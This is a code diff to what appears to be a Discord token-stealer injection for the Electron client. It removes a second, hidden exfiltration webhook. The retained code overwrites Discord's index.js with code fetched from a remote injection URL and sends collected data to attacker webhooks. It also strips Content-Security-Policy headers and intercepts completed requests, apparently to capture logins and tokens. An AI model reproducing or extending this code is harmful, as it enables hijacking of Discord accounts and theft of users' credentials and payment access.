@@ -8,8 +8,6 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
-  webhook1: '%WEBHOOK1%',
-  webhook_protector_key1: '%WEBHOOK_KEY1%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
@@ -446,9 +444,7 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key1}')
-        res.replace('%WEBHOOK1%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY1%', '${config.webhook_protector_key1}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -629,18 +625,12 @@ const getBadges = (flags) => {
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
-  const url1 = new URL(config.webhook1);
   const headers = {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
   };
   if (!config.webhook.includes('api/webhooks')) {
     const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
-    
-  }
-  if (!config.webhook1.includes('api/webhooks1')) {
-    const key = totp(config.webhook_protector_key1);
     headers['Authorization'] = key;
     
   }
@@ -935,44 +925,6 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(config.webhook1)) {
-      if (details.url.includes('discord.com')) {
-        callback({
-          responseHeaders: Object.assign(
-            {
-              'Access-Control-Allow-Headers': '*',
-            },
-            details.responseHeaders,
-          ),
-        });
-      } else {
-        callback({
-          responseHeaders: Object.assign(
-            {
-              'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-              'Access-Control-Allow-Headers': '*',
-              'Access-Control-Allow-Origin': '*',
-            },
-            details.responseHeaders,
-          ),
-        });
-      }
-    } else {
-      delete details.responseHeaders['content-security-policy'];
-      delete details.responseHeaders['content-security-policy-report-only'];
-  
-      callback({
-        responseHeaders: {
-          ...details.responseHeaders,
-          'Access-Control-Allow-Headers': '*',
-        },
-      });
-    }
-  });
-
-
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
